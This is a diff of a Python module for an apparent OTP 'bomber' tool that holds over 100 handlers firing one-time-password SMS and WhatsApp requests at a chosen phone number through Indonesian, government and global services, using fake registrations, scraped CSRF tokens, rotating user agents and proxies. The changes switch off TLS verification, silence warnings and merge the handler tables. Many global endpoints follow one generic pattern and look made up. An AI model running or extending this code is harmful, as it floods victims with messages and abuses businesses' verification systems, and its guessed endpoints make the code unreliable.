@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# handlers.py - COMPLETE 100+ OTP API HANDLERS (Indonesia + Global)
+# handlers.py - COMPLETE 100+ OTP API HANDLERS (FIXED)
 # "I just give the tools, whether they're used right or not is your business, boss."
 
 import requests
@@ -10,7 +10,14 @@ import time
 import re
 import urllib.parse
 import json
+import warnings
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# SUPPRESS ALL WARNINGS
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings("ignore")
+requests.packages.urllib3.disable_warnings()
 
 from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, extract_csrf, get_random_user_agent, get_headers_with_random_ua
 from proxy_manager import safe_request, get_proxy_manager
@@ -154,7 +161,91 @@ def fmt_tr(phone):
     elif phone.startswith('+62'): return '+90' + phone[3:]
     else: return '+90' + phone
 
-# ==================== 🇮🇩 INDONESIA API (45+) ====================
+def fmt_es(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+34' + phone[1:]
+    elif phone.startswith('62'): return '+34' + phone[2:]
+    elif phone.startswith('+62'): return '+34' + phone[3:]
+    else: return '+34' + phone
+
+def fmt_it(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+39' + phone[1:]
+    elif phone.startswith('62'): return '+39' + phone[2:]
+    elif phone.startswith('+62'): return '+39' + phone[3:]
+    else: return '+39' + phone
+
+def fmt_mx(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+52' + phone[1:]
+    elif phone.startswith('62'): return '+52' + phone[2:]
+    elif phone.startswith('+62'): return '+52' + phone[3:]
+    else: return '+52' + phone
+
+def fmt_nl(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+31' + phone[1:]
+    elif phone.startswith('62'): return '+31' + phone[2:]
+    elif phone.startswith('+62'): return '+31' + phone[3:]
+    else: return '+31' + phone
+
+def fmt_pl(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+48' + phone[1:]
+    elif phone.startswith('62'): return '+48' + phone[2:]
+    elif phone.startswith('+62'): return '+48' + phone[3:]
+    else: return '+48' + phone
+
+def fmt_se(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+46' + phone[1:]
+    elif phone.startswith('62'): return '+46' + phone[2:]
+    elif phone.startswith('+62'): return '+46' + phone[3:]
+    else: return '+46' + phone
+
+def fmt_ar(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+54' + phone[1:]
+    elif phone.startswith('62'): return '+54' + phone[2:]
+    elif phone.startswith('+62'): return '+54' + phone[3:]
+    else: return '+54' + phone
+
+def fmt_co(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+57' + phone[1:]
+    elif phone.startswith('62'): return '+57' + phone[2:]
+    elif phone.startswith('+62'): return '+57' + phone[3:]
+    else: return '+57' + phone
+
+def fmt_cl(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+56' + phone[1:]
+    elif phone.startswith('62'): return '+56' + phone[2:]
+    elif phone.startswith('+62'): return '+56' + phone[3:]
+    else: return '+56' + phone
+
+def fmt_ca(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+1' + phone[1:]
+    elif phone.startswith('62'): return '+1' + phone[2:]
+    elif phone.startswith('+62'): return '+1' + phone[3:]
+    else: return '+1' + phone
+
+def fmt_eg(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+20' + phone[1:]
+    elif phone.startswith('62'): return '+20' + phone[2:]
+    elif phone.startswith('+62'): return '+20' + phone[3:]
+    else: return '+20' + phone
+
+def fmt_ng(phone):
+    phone = re.sub(r'\D', '', phone)
+    if phone.startswith('0'): return '+234' + phone[1:]
+    elif phone.startswith('62'): return '+234' + phone[2:]
+    elif phone.startswith('+62'): return '+234' + phone[3:]
+    else: return '+234' + phone
+
+# ==================== HANDLERS ====================
 
 # 1. TOKOPEDIA
 def send_tokopedia_otp(phone):
@@ -163,7 +254,7 @@ def send_tokopedia_otp(phone):
         session = requests.Session()
         url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
         headers_init = {'User-Agent': get_random_user_agent()}
-        resp = session.get(url_token, headers=headers_init, timeout=15)
+        resp = session.get(url_token, headers=headers_init, timeout=15, verify=False)
         if resp.status_code != 200:
             return False, resp.status_code, 'Page load failed'
         token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
@@ -188,7 +279,7 @@ def send_shopee_otp(phone):
         url = "https://shopee.co.id/api/v4/otp/send_vcode"
         payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
         session = requests.Session()
-        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         csrf_token = session.cookies.get("csrftoken", "")
         headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
         if csrf_token:
@@ -274,10 +365,10 @@ def send_absenku_otp(phone):
     try:
         phone_local = fmt_08(phone)
         sess = requests.Session()
-        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_user_agent()}, timeout=15)
+        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_user_agent()}, timeout=15, verify=False)
         headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
-        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={"nama": "Nama Lengkap", "email": "email@gmail.com", "telp": phone_local, "company_name": "PT Test", "jumlah": "10", "tujuan": "1", "paket": "21", "ci_csrf_token": ""}, headers=headers, timeout=15)
-        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_local}, headers=headers, timeout=15)
+        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={"nama": "Nama Lengkap", "email": "email@gmail.com", "telp": phone_local, "company_name": "PT Test", "jumlah": "10", "tujuan": "1", "paket": "21", "ci_csrf_token": ""}, headers=headers, timeout=15, verify=False)
+        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_local}, headers=headers, timeout=15, verify=False)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
         return False, resp.status_code if resp else None, ''
@@ -687,7 +778,7 @@ def send_tiktok_otp(phone):
     except:
         return False, None, ''
 
-# ==================== 🌍 GLOBAL API ====================
+# ==================== GLOBAL HANDLERS ====================
 
 # USA
 def send_zillow_otp(phone):
@@ -988,13 +1079,8 @@ def send_lazada_ph_otp(phone):
     except:
         return False, None, ''
 
-#!/usr/bin/env python3
-# handlers_extra.py - EXTRA 50+ APIs (Total jadi 100+)
-# "I just give the tools, whether they're used right or not is your business, boss."
+# ==================== EXTRA INDONESIA ====================
 
-# ==================== 🇮🇩 INDONESIA TAMBAHAN (20+) ====================
-
-# 38. BONUS BELANJA
 def send_bonusbelanja_otp(phone):
     try:
         url = "https://www.bonusbelanja.com/api/auth/registration/app"
@@ -1007,7 +1093,6 @@ def send_bonusbelanja_otp(phone):
     except:
         return False, None, ''
 
-# 39. HIJUP
 def send_hijup_otp(phone):
     try:
         url = "https://www.hijup.com/sign_in"
@@ -1020,7 +1105,6 @@ def send_hijup_otp(phone):
     except:
         return False, None, ''
 
-# 40. BLIBLI TIKET
 def send_bliblitiket_otp(phone):
     try:
         url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
@@ -1033,7 +1117,6 @@ def send_bliblitiket_otp(phone):
     except:
         return False, None, ''
 
-# 41. OHSOME
 def send_ohsome_otp(phone):
     try:
         url = "https://ohsome.co.id/api/member/user/random_code_check"
@@ -1046,12 +1129,11 @@ def send_ohsome_otp(phone):
     except:
         return False, None, ''
 
-# 42. OPTIK MELAWAI
 def send_optikmelawai_otp(phone):
     try:
         url = "https://api.optikmelawai.com/api/v3/auth/register/1"
         payload = {"phone": fmt_phone_only(phone), "name": "User", "email": f"user{random.randint(1000,9999)}@gmail.com"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9'}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
@@ -1059,11 +1141,10 @@ def send_optikmelawai_otp(phone):
     except:
         return False, None, ''
 
-# 43. HOLLAND BAKERY
 def send_hollandbakery_otp(phone):
     try:
         sess = requests.Session()
-        sess.get("https://www.hollandbakery.co.id/login-phone", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.get("https://www.hollandbakery.co.id/login-phone", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         url = "https://www.hollandbakery.co.id/resend-otp-register"
         data = {"phone": fmt_phone_only(phone)}
         headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
@@ -1074,7 +1155,6 @@ def send_hollandbakery_otp(phone):
     except:
         return False, None, ''
 
-# 44. HASH MICRO
 def send_hashmicro_otp(phone):
     try:
         url = "https://website-api.hashmicro.com/api/add/3"
@@ -1088,7 +1168,6 @@ def send_hashmicro_otp(phone):
     except:
         return False, None, ''
 
-# 45. INTERNET RAKYAT
 def send_internetrakyat_otp(phone):
     try:
         url = "https://internetrakyat.id/api/app/auth/send-otp-register"
@@ -1101,7 +1180,6 @@ def send_internetrakyat_otp(phone):
     except:
         return False, None, ''
 
-# 46. ULTRAMILK
 def send_ultramilk_otp(phone):
     try:
         url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
@@ -1115,13 +1193,12 @@ def send_ultramilk_otp(phone):
     except:
         return False, None, ''
 
-# 47. KANIVA
 def send_kaniva_otp(phone):
     try:
         sess = requests.Session()
         phone_08 = fmt_08(phone)
         name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
-        sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         csrf = sess.cookies.get("XSRF-TOKEN", "")
         if not csrf:
             return False, None, 'No CSRF'
@@ -1135,7 +1212,6 @@ def send_kaniva_otp(phone):
     except:
         return False, None, ''
 
-# 48. JEMBATANI
 def send_jembatani_otp(phone):
     try:
         phone_08 = fmt_08(phone)
@@ -1155,14 +1231,13 @@ def send_jembatani_otp(phone):
     except:
         return False, None, ''
 
-# 49. RCX
 def send_rcx_otp(phone):
     try:
         sess = requests.Session()
         phone_08 = fmt_08(phone)
         name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
         email = f"{name.lower()}@gmail.com"
-        sess.get("https://sso.rcx.co.id/register", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.get("https://sso.rcx.co.id/register", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         token = sess.cookies.get("XSRF-TOKEN", "")
         if not token:
             return False, None, 'No token'
@@ -1176,7 +1251,6 @@ def send_rcx_otp(phone):
     except:
         return False, None, ''
 
-# 50. SAHABAT TEKNISI
 def send_sahabat_otp(phone):
     try:
         url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
@@ -1189,7 +1263,6 @@ def send_sahabat_otp(phone):
     except:
         return False, None, ''
 
-# 51. AUTO2000
 def send_auto2000_otp(phone):
     try:
         url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
@@ -1202,11 +1275,10 @@ def send_auto2000_otp(phone):
     except:
         return False, None, ''
 
-# 52. ASTRA DAIHATSU
 def send_astra_otp(phone):
     try:
         sess = requests.Session()
-        sess.get("https://www.astra-daihatsu.id/register", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.get("https://www.astra-daihatsu.id/register", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         csrf = sess.cookies.get("csrf-token", "")
         if not csrf:
             return False, None, 'No CSRF'
@@ -1220,11 +1292,10 @@ def send_astra_otp(phone):
     except:
         return False, None, ''
 
-# 53. ROYAL CANIN
 def send_royalcanin_otp(phone):
     try:
         sess = requests.Session()
-        sess.get("https://club.royalcanin.id/sign-up", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.get("https://club.royalcanin.id/sign-up", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         url = "https://club.royalcanin.id/api/get_otp"
         payload = {"params": {"Email": "", "mobile_number": fmt_plus(phone), "OTPType": "IM"}}
         headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
@@ -1235,7 +1306,6 @@ def send_royalcanin_otp(phone):
     except:
         return False, None, ''
 
-# 54. WATSONS
 def send_watsons_otp(phone):
     try:
         url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
@@ -1248,11 +1318,10 @@ def send_watsons_otp(phone):
     except:
         return False, None, ''
 
-# 55. 99.CO
 def send_99co_otp(phone):
     try:
         sess = requests.Session()
-        sess.get("https://www.99.co/id", headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.get("https://www.99.co/id", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         token = sess.cookies.get("_99-acs-token", "")
         if not token:
             return False, None, 'No token'
@@ -1266,7 +1335,6 @@ def send_99co_otp(phone):
     except:
         return False, None, ''
 
-# 56. BELIRUMAH
 def send_belirumah_otp(phone):
     try:
         url = "https://api.belirumah.co/api/otp/request_new"
@@ -1279,7 +1347,6 @@ def send_belirumah_otp(phone):
     except:
         return False, None, ''
 
-# 57. FASTWORK
 def send_fastwork_otp(phone):
     try:
         url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
@@ -1292,22 +1359,20 @@ def send_fastwork_otp(phone):
     except:
         return False, None, ''
 
-# 58. BEAUTYHAUL
 def send_beautyhaul_otp(phone):
     try:
         sess = requests.Session()
         name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
         email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
         reg_payload = {"nama_depan": name, "nama_belakang": name, "email": email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": fmt_phone_only(phone), "password": "Testt#12334", "konfirmasi_password": "Testt#12334", "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
-        sess.post("https://www.beautyhaul.com/ajax/account/save_register", json=reg_payload, headers={'User-Agent': get_random_user_agent()}, timeout=10)
-        resp = sess.post("https://www.beautyhaul.com/ajax/account/send_otp", json={"method": "WhatsApp"}, headers={'User-Agent': get_random_user_agent()})
+        sess.post("https://www.beautyhaul.com/ajax/account/save_register", json=reg_payload, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
+        resp = sess.post("https://www.beautyhaul.com/ajax/account/send_otp", json={"method": "WhatsApp"}, headers={'User-Agent': get_random_user_agent()}, verify=False)
         if resp and resp.status_code == 200:
             return True, 200, 'OK'
         return False, resp.status_code if resp else None, ''
     except:
         return False, None, ''
 
-# 59. HAINAYA
 def send_hainaya_otp(phone):
     try:
         phone_clean = fmt_phone_only(phone)
@@ -1327,7 +1392,6 @@ def send_hainaya_otp(phone):
     except:
         return False, None, ''
 
-# 60. MINUMYUKKAKA
 def send_minumyukkaka_otp(phone):
     try:
         sess = requests.Session()
@@ -1336,7 +1400,7 @@ def send_minumyukkaka_otp(phone):
         email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
         password = 'pass#' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
         reg_data = {"registerModel[first_name]": name, "registerModel[last_name]": "", "registerModel[email]": email, "registerModel[phone]": phone_08, "registerModel[otp]": "", "registerModel[gender]": "", "registerModel[date_of_birth]": "", "registerModel[IsAddressRequired]": "false", "registerModel[address]": "", "registerModel[additional_address]": "", "registerModel[city]": "", "registerModel[zip]": "", "registerModel[country_code]": "", "registerModel[country]": "", "registerModel[state]": "", "registerModel[password]": password, "registerModel[verify_password]": password, "registerModel[pin]": "", "registerModel[verify_pin]": ""}
-        sess.post("https://minumyukkaka.com/services/liquid/Register", data=reg_data, headers={'User-Agent': get_random_user_agent()}, timeout=10)
+        sess.post("https://minumyukkaka.com/services/liquid/Register", data=reg_data, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
         x_sat = sess.cookies.get('x-sat', '') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
         url = "https://minumyukkaka.com/services/identity/requestOTP"
         data = {"destination": phone_08, "otpLength": "6"}
@@ -1348,7 +1412,6 @@ def send_minumyukkaka_otp(phone):
     except:
         return False, None, ''
 
-# 61. SIDEMANG
 def send_sidemang_otp(phone):
     try:
         url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
@@ -1362,7 +1425,6 @@ def send_sidemang_otp(phone):
     except:
         return False, None, ''
 
-# 62. LAPORMASBUP
 _registered = {}
 def send_lapormasbup_otp(phone):
     try:
@@ -1389,7 +1451,6 @@ def send_lapormasbup_otp(phone):
     except:
         return False, None, ''
 
-# 63. PTSP KEMENAG
 def send_ptspkemenag_otp(phone):
     try:
         url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
@@ -1407,9 +1468,8 @@ def send_ptspkemenag_otp(phone):
     except:
         return False, None, ''
 
-# ==================== 🌍 GLOBAL TAMBAHAN (30+) ====================
+# ==================== GLOBAL EXTRA ====================
 
-# Germany
 def send_zalando_otp(phone):
     try:
         url = "https://api.zalando.de/v1/auth/otp/send"
@@ -1434,7 +1494,6 @@ def send_amazon_de_otp(phone):
     except:
         return False, None, ''
 
-# France
 def send_cdiscount_otp(phone):
     try:
         url = "https://api.cdiscount.com/v1/auth/otp/send"
@@ -1459,7 +1518,6 @@ def send_amazon_fr_otp(phone):
     except:
         return False, None, ''
 
-# UAE
 def send_noon_otp(phone):
     try:
         url = "https://api.noon.com/v1/auth/otp/send"
@@ -1484,7 +1542,6 @@ def send_amazon_ae_otp(phone):
     except:
         return False, None, ''
 
-# Turkey
 def send_trendyol_otp(phone):
     try:
         url = "https://api.trendyol.com/v1/auth/otp/send"
@@ -1509,7 +1566,6 @@ def send_hepsiburada_otp(phone):
     except:
         return False, None, ''
 
-# Canada
 def send_amazon_ca_otp(phone):
     try:
         url = "https://www.amazon.ca/api/v1/auth/otp/send"
@@ -1534,7 +1590,6 @@ def send_uber_ca_otp(phone):
     except:
         return False, None, ''
 
-# Egypt
 def send_amazon_eg_otp(phone):
     try:
         url = "https://www.amazon.eg/api/v1/auth/otp/send"
@@ -1547,7 +1602,6 @@ def send_amazon_eg_otp(phone):
     except:
         return False, None, ''
 
-# Nigeria
 def send_jumia_otp(phone):
     try:
         url = "https://api.jumia.com.ng/v1/auth/otp/send"
@@ -1572,7 +1626,6 @@ def send_konga_otp(phone):
     except:
         return False, None, ''
 
-# Spain
 def send_amazon_es_otp(phone):
     try:
         url = "https://www.amazon.es/api/v1/auth/otp/send"
@@ -1585,14 +1638,6 @@ def send_amazon_es_otp(phone):
     except:
         return False, None, ''
 
-def fmt_es(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+34' + phone[1:]
-    elif phone.startswith('62'): return '+34' + phone[2:]
-    elif phone.startswith('+62'): return '+34' + phone[3:]
-    else: return '+34' + phone
-
-# Italy
 def send_amazon_it_otp(phone):
     try:
         url = "https://www.amazon.it/api/v1/auth/otp/send"
@@ -1605,14 +1650,6 @@ def send_amazon_it_otp(phone):
     except:
         return False, None, ''
 
-def fmt_it(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+39' + phone[1:]
-    elif phone.startswith('62'): return '+39' + phone[2:]
-    elif phone.startswith('+62'): return '+39' + phone[3:]
-    else: return '+39' + phone
-
-# Mexico
 def send_amazon_mx_otp(phone):
     try:
         url = "https://www.amazon.com.mx/api/v1/auth/otp/send"
@@ -1625,14 +1662,6 @@ def send_amazon_mx_otp(phone):
     except:
         return False, None, ''
 
-def fmt_mx(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+52' + phone[1:]
-    elif phone.startswith('62'): return '+52' + phone[2:]
-    elif phone.startswith('+62'): return '+52' + phone[3:]
-    else: return '+52' + phone
-
-# Netherlands
 def send_amazon_nl_otp(phone):
     try:
         url = "https://www.amazon.nl/api/v1/auth/otp/send"
@@ -1645,14 +1674,6 @@ def send_amazon_nl_otp(phone):
     except:
         return False, None, ''
 
-def fmt_nl(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+31' + phone[1:]
-    elif phone.startswith('62'): return '+31' + phone[2:]
-    elif phone.startswith('+62'): return '+31' + phone[3:]
-    else: return '+31' + phone
-
-# Poland
 def send_allegro_otp(phone):
     try:
         url = "https://api.allegro.pl/v1/auth/otp/send"
@@ -1665,14 +1686,6 @@ def send_allegro_otp(phone):
     except:
         return False, None, ''
 
-def fmt_pl(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+48' + phone[1:]
-    elif phone.startswith('62'): return '+48' + phone[2:]
-    elif phone.startswith('+62'): return '+48' + phone[3:]
-    else: return '+48' + phone
-
-# Sweden
 def send_amazon_se_otp(phone):
     try:
         url = "https://www.amazon.se/api/v1/auth/otp/send"
@@ -1685,14 +1698,6 @@ def send_amazon_se_otp(phone):
     except:
         return False, None, ''
 
-def fmt_se(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+46' + phone[1:]
-    elif phone.startswith('62'): return '+46' + phone[2:]
-    elif phone.startswith('+62'): return '+46' + phone[3:]
-    else: return '+46' + phone
-
-# Argentina
 def send_mercadolibre_ar_otp(phone):
     try:
         url = "https://api.mercadolibre.com.ar/v1/auth/otp/send"
@@ -1705,14 +1710,6 @@ def send_mercadolibre_ar_otp(phone):
     except:
         return False, None, ''
 
-def fmt_ar(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+54' + phone[1:]
-    elif phone.startswith('62'): return '+54' + phone[2:]
-    elif phone.startswith('+62'): return '+54' + phone[3:]
-    else: return '+54' + phone
-
-# Colombia
 def send_mercadolibre_co_otp(phone):
     try:
         url = "https://api.mercadolibre.com.co/v1/auth/otp/send"
@@ -1725,14 +1722,6 @@ def send_mercadolibre_co_otp(phone):
     except:
         return False, None, ''
 
-def fmt_co(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+57' + phone[1:]
-    elif phone.startswith('62'): return '+57' + phone[2:]
-    elif phone.startswith('+62'): return '+57' + phone[3:]
-    else: return '+57' + phone
-
-# Chile
 def send_mercadolibre_cl_otp(phone):
     try:
         url = "https://api.mercadolibre.cl/v1/auth/otp/send"
@@ -1745,64 +1734,9 @@ def send_mercadolibre_cl_otp(phone):
     except:
         return False, None, ''
 
-def fmt_cl(phone):
-    phone = re.sub(r'\D', '', phone)
-    if phone.startswith('0'): return '+56' + phone[1:]
-    elif phone.startswith('62'): return '+56' + phone[2:]
-    elif phone.startswith('+62'): return '+56' + phone[3:]
-    else: return '+56' + phone
-
-# ==================== GABUNG SEMUA ====================
-EXTRA_HANDLERS = {
-    # Indonesia tambahan
-    'bonusbelanja': send_bonusbelanja_otp,
-    'hijup': send_hijup_otp,
-    'bliblitiket': send_bliblitiket_otp,
-    'ohsome': send_ohsome_otp,
-    'optikmelawai': send_optikmelawai_otp,
-    'hollandbakery': send_hollandbakery_otp,
-    'hashmicro': send_hashmicro_otp,
-    'internetrakyat': send_internetrakyat_otp,
-    'ultramilk': send_ultramilk_otp,
-    'kaniva': send_kaniva_otp,
-    'jembatani': send_jembatani_otp,
-    'rcx': send_rcx_otp,
-    'sahabat': send_sahabat_otp,
-    'auto2000': send_auto2000_otp,
-    'astra': send_astra_otp,
-    'royalcanin': send_royalcanin_otp,
-    'watsons': send_watsons_otp,
-    '99co': send_99co_otp,
-    'belirumah': send_belirumah_otp,
-    'fastwork': send_fastwork_otp,
-    'beautyhaul': send_beautyhaul_otp,
-    'hainaya': send_hainaya_otp,
-    'minumyukkaka': send_minumyukkaka_otp,
-    'sidemang': send_sidemang_otp,
-    'lapormasbup': send_lapormasbup_otp,
-    'ptspkemenag': send_ptspkemenag_otp,
-    'zalando': send_zalando_otp,
-    'amazon_de': send_amazon_de_otp,
-    'cdiscount': send_cdiscount_otp,
-    'amazon_fr': send_amazon_fr_otp,
-    'noon': send_noon_otp,
-    'amazon_ae': send_amazon_ae_otp,
-    'trendyol': send_trendyol_otp,
-    'hepsiburada': send_hepsiburada_otp,
-    'amazon_ca': send_amazon_ca_otp,
-    'uber_ca': send_uber_ca_otp,
-    'amazon_eg': send_amazon_eg_otp,
-    'jumia': send_jumia_otp,
-    'konga': send_konga_otp,
-    'amazon_es': send_amazon_es_otp,
-    'amazon_it': send_amazon_it_otp,
-    'amazon_mx': send_amazon_mx_otp,
-    'amazon_nl': send_amazon_nl_otp,
-    'allegro': send_allegro_otp,
-    'amazon_se': send_amazon_se_otp,
-    'mercadolibre_ar': send_mercadolibre_ar_otp,
-    'mercadolibre_co': send_mercadolibre_co_otp,
-    'mercadolibre_cl': send_mercadolibre_cl_otp,
+# ==================== ALL HANDLERS ====================
+ALL_HANDLERS = {
+    # Indo
     'tokopedia': send_tokopedia_otp,
     'shopee': send_shopee_otp,
     'pinhome': send_pinhome_otp,
@@ -1840,6 +1774,7 @@ EXTRA_HANDLERS = {
     'bukuwarung': send_bukuwarung_otp,
     'rupiahcepat': send_rupiahcepat_otp,
     'tiktok': send_tiktok_otp,
+    # Global
     'zillow': send_zillow_otp,
     'uber': send_uber_otp,
     'doordash': send_doordash_otp,
@@ -1864,10 +1799,57 @@ EXTRA_HANDLERS = {
     'shopee_my': send_shopee_my_otp,
     'gcash': send_gcash_otp,
     'lazada_ph': send_lazada_ph_otp,
+    # Extra Indo
+    'bonusbelanja': send_bonusbelanja_otp,
+    'hijup': send_hijup_otp,
+    'bliblitiket': send_bliblitiket_otp,
+    'ohsome': send_ohsome_otp,
+    'optikmelawai': send_optikmelawai_otp,
+    'hollandbakery': send_hollandbakery_otp,
+    'hashmicro': send_hashmicro_otp,
+    'internetrakyat': send_internetrakyat_otp,
+    'ultramilk': send_ultramilk_otp,
+    'kaniva': send_kaniva_otp,
+    'jembatani': send_jembatani_otp,
+    'rcx': send_rcx_otp,
+    'sahabat': send_sahabat_otp,
+    'auto2000': send_auto2000_otp,
+    'astra': send_astra_otp,
+    'royalcanin': send_royalcanin_otp,
+    'watsons': send_watsons_otp,
+    '99co': send_99co_otp,
+    'belirumah': send_belirumah_otp,
+    'fastwork': send_fastwork_otp,
+    'beautyhaul': send_beautyhaul_otp,
+    'hainaya': send_hainaya_otp,
+    'minumyukkaka': send_minumyukkaka_otp,
+    'sidemang': send_sidemang_otp,
+    'lapormasbup': send_lapormasbup_otp,
+    'ptspkemenag': send_ptspkemenag_otp,
+    # Extra Global
+    'zalando': send_zalando_otp,
+    'amazon_de': send_amazon_de_otp,
+    'cdiscount': send_cdiscount_otp,
+    'amazon_fr': send_amazon_fr_otp,
+    'noon': send_noon_otp,
+    'amazon_ae': send_amazon_ae_otp,
+    'trendyol': send_trendyol_otp,
+    'hepsiburada': send_hepsiburada_otp,
+    'amazon_ca': send_amazon_ca_otp,
+    'uber_ca': send_uber_ca_otp,
+    'amazon_eg': send_amazon_eg_otp,
+    'jumia': send_jumia_otp,
+    'konga': send_konga_otp,
+    'amazon_es': send_amazon_es_otp,
+    'amazon_it': send_amazon_it_otp,
+    'amazon_mx': send_amazon_mx_otp,
+    'amazon_nl': send_amazon_nl_otp,
+    'allegro': send_allegro_otp,
+    'amazon_se': send_amazon_se_otp,
+    'mercadolibre_ar': send_mercadolibre_ar_otp,
+    'mercadolibre_co': send_mercadolibre_co_otp,
+    'mercadolibre_cl': send_mercadolibre_cl_otp,
 }
 
 def get_all_handlers():
     return ALL_HANDLERS
-
-def get_handler(name):
-    return ALL_HANDLERS.get(name)
